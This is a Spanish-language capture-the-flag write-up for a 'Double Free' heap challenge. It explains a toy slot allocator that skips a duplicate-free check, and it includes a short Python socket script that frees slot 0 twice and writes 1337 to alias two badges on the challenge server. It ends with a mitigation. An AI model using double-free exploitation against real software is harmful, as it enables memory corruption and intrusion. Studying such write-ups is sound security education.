# Double Free

| | |
|---|---|
| **Categoría** | Pwn / Heap |
| **Dificultad** | Media |
| **Puntos** | 200 |
| **Reto #** | 15 |
| **Conexión** | `nc chals.tropicalhunters.com 9009` |

## Descripción

Un asignador de insignias (badges) reutiliza ranuras liberadas pero no verifica si una ranura ya estaba libre. Liberar el mismo slot dos veces hace que dos badges compartan la misma memoria.

## Análisis

```
globals:
  slots[2]      @ 0x404070   ← array de insignias (int32)
  free_slots[2] @ 0x404078   ← lista LIFO de slots libres
  free_count     @ 0x404080

release_slot(n):
  if free_count < 2:
    free_slots[free_count++] = n   ← sin check de duplicado  ❌

allocate_slot():
  if free_count > 0:
    return &slots[ free_slots[--free_count] ]
  else:
    return &slots[next_slot++]
```

**Con `s1 = s2 = 0`** (double free del slot 0):

```
free_slots = [0, 0]
badge1 = &slots[0]   ← misma dirección
badge2 = &slots[0]   ← alias perfecto
```

Escribir `1337` en `badge1` → `badge2` lo lee → condición cumplida.

## Solución

```python
import socket

s = socket.socket()
s.connect(("chals.tropicalhunters.com", 9009))
s.recv(1024)

s.sendall(b"0 0\n")    # double free: liberar slot 0 dos veces
s.recv(1024)
s.sendall(b"1337\n")   # badge1[0] = 1337  →  badge2[0] == 1337  ✓
print(s.recv(1024).decode())
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- **Double Free**: liberar el mismo slot dos veces sin validación permite que dos punteros apunten al mismo objeto.
- En heap real (glibc), el double free corrompe las listas del allocator; aquí el asignador simplista lo expone directamente.
- Mitigación: verificar que el slot no esté ya en la lista libre antes de añadirlo.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
